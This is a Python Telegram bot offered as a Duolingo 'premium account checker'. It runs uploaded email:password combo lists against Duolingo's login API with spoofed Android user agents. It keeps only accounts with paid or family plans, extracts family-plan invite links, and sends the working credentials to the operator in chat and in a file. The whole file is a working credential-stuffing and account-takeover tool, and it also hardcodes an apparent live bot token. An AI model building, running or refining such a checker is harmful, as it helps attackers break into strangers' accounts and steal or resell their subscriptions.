import telebot
import requests
import json
import time
import uuid
import logging
import threading
from datetime import datetime

# ========== CONFIGURATION ==========
BOT_TOKEN = "8689449943:AAHFZdaE4L0TkH6S9BAAtmdWbwoTJYyzcJQ"
ADMIN_ID = 8770379893
# ===================================

# Setup logging for terminal output
logging.basicConfig(
    format='%(asctime)s - %(message)s',
    level=logging.INFO,
    datefmt='%H:%M:%S'
)

bot = telebot.TeleBot(BOT_TOKEN)

# Global variables for stop functionality
checking_active = False
stop_flag = False
current_combo_list = []
current_chat_id = None

def get_headers(ua, jwt=None):
    headers = {
        "User-Agent": ua,
        "Pragma": "no-cache",
        "Accept-Encoding": "gzip",
        "Accept-Language": "en-US,en;q=0.8",
        "Host": "android-api.duolingo.cn",
        "X-Amzn-Trace-Id": "User=0"
    }
    if jwt:
        headers["Authorization"] = f"Bearer {jwt}"
        headers["Accept"] = "application/json"
        headers["Connection"] = "Keep-Alive"
    return headers

def generate_ua():
    versions = ["10", "11", "12", "13"]
    models = ["SM-G991B", "Pixel 6", "OnePlus 9", "Xiaomi Mi 11"]
    return f"Dalvik/2.1.0 (Linux; U; Android {versions[hash(str(time.time())) % len(versions)]}; {models[hash(str(time.time())) % len(models)]} Build/RP1A.200720.012)"

def check_duolingo(email, password):
    session = requests.Session()
    ua = generate_ua()
    
    try:
        # Login
        login_url = "https://android-api.duolingo.cn/2017-06-30/login?fields=id"
        distinct_id = str(uuid.uuid4())
        
        login_payload = {
            "distinctId": distinct_id,
            "identifier": email,
            "password": password
        }
        
        login_headers = get_headers(ua)
        login_headers["Content-Type"] = "application/json"
        
        resp = session.post(login_url, json=login_payload, headers=login_headers, timeout=15)
        
        if resp.status_code != 200:
            return None, None, None
        
        login_data = resp.json()
        user_id = login_data.get("id")
        if not user_id:
            return None, None, None
        
        # Get JWT from cookies
        jwt_token = None
        for cookie in session.cookies:
            if cookie.name == "jwt_token":
                jwt_token = cookie.value
                break
        
        if not jwt_token:
            return None, None, None
        
        # Get profile
        profile_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage%2ClearningLanguage%2CgemsConfig%2ChasPlus%2CsubscriptionConfigs"
        
        profile_headers = get_headers(ua, jwt_token)
        
        resp2 = session.get(profile_url, headers=profile_headers, timeout=15)
        
        if resp2.status_code != 200:
            return None, None, None
        
        data = resp2.json()
        
        # Extract data
        username = data.get("username", "N/A")
        total_xp = data.get("totalXp", 0)
        gems = data.get("gemsConfig", {}).get("gems", 0)
        streak = data.get("streakData", {}).get("length", 0)
        learning_lang = data.get("learningLanguage", "N/A")
        from_lang = data.get("fromLanguage", "N/A")
        
        # Premium detection
        shop_items = data.get("shopItems", [])
        has_premium = data.get("hasPlus", False)
        invite_token = None
        expiry_date = "N/A"
        product_id = "N/A"
        renewing = "N/A"
        plan_tier = "FREE"
        
        for item in shop_items:
            sub_info = item.get("subscriptionInfo", {})
            if sub_info:
                has_premium = True
                product_id = sub_info.get("productId", "N/A")
                renewing = "Yes" if sub_info.get("renewing") else "No"
                if sub_info.get("expectedExpiration"):
                    expiry_date = datetime.fromtimestamp(sub_info.get("expectedExpiration") / 1000).strftime("%Y-%m-%d")
            
            family_info = item.get("familyPlanInfo", {})
            if family_info:
                invite_token = family_info.get("inviteToken")
                plan_tier = "FAMILY"
        
        if not has_premium and data.get("subscriptionConfigs"):
            has_premium = True
            plan_tier = "PREMIUM"
        
        # If not premium, return None
        if not has_premium:
            return None, None, None
        
        # Build result for HIT
        if plan_tier == "FAMILY" and invite_token:
            invite_link = f"https://www.duolingo.com/family-plan?invite={invite_token}"
            result = f"""
✅ **PREMIUM HIT!**

📊 **ACCOUNT:**
├─ Email: `{email}`
├─ Username: `{username}`
├─ Total XP: `{total_xp:,}`
├─ Streak: `{streak} days` 🔥
├─ Learning: `{learning_lang}`
└─ Plan: 👨‍👩‍👧 **FAMILY PLAN**

🔗 **Invite Link:** {invite_link}

💎 **Subscription:**
├─ Product: `{product_id}`
├─ Renewing: `{renewing}`
└─ Expires: `{expiry_date}`

📱 Checked by: [ DUOLINGO ] BY ThuYa V3
"""
        else:
            result = f"""
✅ **PREMIUM HIT!**

📊 **ACCOUNT:**
├─ Email: `{email}`
├─ Username: `{username}`
├─ Total XP: `{total_xp:,}`
├─ Streak: `{streak} days` 🔥
├─ Learning: `{learning_lang}`
└─ Plan: ⭐ **SUPER/PREMIUM**

💎 **Subscription:**
├─ Product: `{product_id}`
├─ Renewing: `{renewing}`
└─ Expires: `{expiry_date}`

📱 Checked by: [ DUOLINGO ] BY ThuYa V3
"""
        
        return "HIT", result, invite_link
        
    except Exception as e:
        return None, None, None

def process_combos(chat_id, combos, message_id):
    global checking_active, stop_flag
    
    checking_active = True
    stop_flag = False
    
    premium_hits = []
    total = len(combos)
    
    # Send initial message
    bot.edit_message_text(f"📥 `{total}` combos loaded.\n🔍 Checking started...\n\n_Use /stop to cancel_", chat_id, message_id, parse_mode="Markdown")
    
    for i, (email, pwd) in enumerate(combos):
        if stop_flag:
            bot.send_message(chat_id, "🛑 **Checking stopped by user.**", parse_mode="Markdown")
            logging.info(f"🛑 Stopped by user at {i+1}/{total}")
            break
        
        # Log to terminal only
        logging.info(f"[{i+1}/{total}] Checking: {email}")
        
        status, result, invite_link = check_duolingo(email, pwd)
        
        if status == "HIT":
            premium_hits.append((email, pwd, result))
            # Send to Telegram immediately when HIT found
            bot.send_message(chat_id, result, parse_mode="Markdown")
            logging.info(f"✅ HIT: {email}")
        else:
            logging.info(f"❌ FAIL: {email}")
        
        # Update progress every 50 combos
        if (i+1) % 50 == 0 and not stop_flag:
            bot.edit_message_text(f"📥 `{total}` combos loaded.\n🔍 Checking... `{i+1}/{total}` completed.\n⭐ HIT found: `{len(premium_hits)}`\n\n_Use /stop to cancel_", chat_id, message_id, parse_mode="Markdown")
        
        time.sleep(1.5)
    
    # Summary
    summary = f"""
✅ **Check Completed!**

📊 **Summary:**
├─ Total: `{total}`
├─ ⭐ Premium/Family HIT: `{len(premium_hits)}`
└─ ❌ Failed/Free: `{total - len(premium_hits)}`

💾 Premium accounts saved below 👇
"""
    bot.send_message(chat_id, summary, parse_mode="Markdown")
    
    # Send hits file
    if premium_hits:
        hit_content = f"# [ DUOLINGO ] BY ThuYa V3\n# Author: @thuyaaungzaw\n# Premium/Family Accounts\n# Total: {len(premium_hits)}\n\n"
        for email, pwd, result in premium_hits:
            hit_content += f"{email}:{pwd}\n{result}\n{'='*60}\n\n"
        
        with open("premium_hits.txt", "w", encoding="utf-8") as f:
            f.write(hit_content)
        
        with open("premium_hits.txt", "rb") as f:
            bot.send_document(chat_id, f)
    else:
        bot.send_message(chat_id, "No premium/family accounts found.")
    
    checking_active = False
    stop_flag = False

@bot.message_handler(commands=['start'])
def start_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Unauthorized user.")
        return
    
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn = telebot.types.KeyboardButton("📂 Check Duolingo Premium Accounts")
    markup.add(btn)
    
    bot.reply_to(
        message,
        "👋 **Duolingo Premium Account Checker**\n\n"
        "**Config:** [ DUOLINGO ] BY ThuYa V3\n"
        "**Author:** @thuyaaungzaw\n\n"
        "Click button below and send your **email:pass** combo file (.txt)\n\n"
        "Format: `email@gmail.com:password123`\n\n"
        "⚠️ **Only HIT (Premium/Family) accounts will appear here.**\n"
        "❌ Failed/Free accounts are logged in terminal only.\n\n"
        "🛑 Use `/stop` to cancel checking.",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.message_handler(commands=['stop'])
def stop_command(message):
    global stop_flag, checking_active
    
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Unauthorized.")
        return
    
    if checking_active:
        stop_flag = True
        bot.reply_to(message, "🛑 **Stopping check...** Please wait.")
        logging.info("🛑 Stop command received")
    else:
        bot.reply_to(message, "ℹ️ No active check to stop.")

@bot.message_handler(func=lambda m: m.text == "📂 Check Duolingo Premium Accounts")
def ask_file(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.reply_to(message, "📎 Send your **email:pass** combo file (.txt)", parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    global current_combo_list, current_chat_id, checking_active
    
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Unauthorized")
        return
    
    if checking_active:
        bot.reply_to(message, "⚠️ A check is already running. Use /stop to cancel first.")
        return
    
    status_msg = bot.reply_to(message, "📥 Downloading file...")
    
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    content = downloaded_file.decode('utf-8', errors='ignore')
    combos = []
    for line in content.split('\n'):
        line = line.strip()
        if ':' in line and line.count(':') == 1:
            email, pwd = line.split(':', 1)
            combos.append((email.strip(), pwd.strip()))
    
    if not combos:
        bot.edit_message_text("❌ No valid combos found. Format: email:pass", status_msg.chat.id, status_msg.message_id)
        return
    
    current_combo_list = combos
    current_chat_id = message.chat.id
    
    # Start checking in background thread
    thread = threading.Thread(target=process_combos, args=(message.chat.id, combos, status_msg.message_id))
    thread.start()

print("🤖 Duolingo Premium Checker Bot is running...")
print("Config: [ DUOLINGO ] BY ThuYa V3")
print("Author: @thyaaungzaw")
print("Features: Terminal only logging, HIT sent to Telegram, /stop to cancel")
bot.infinity_polling()
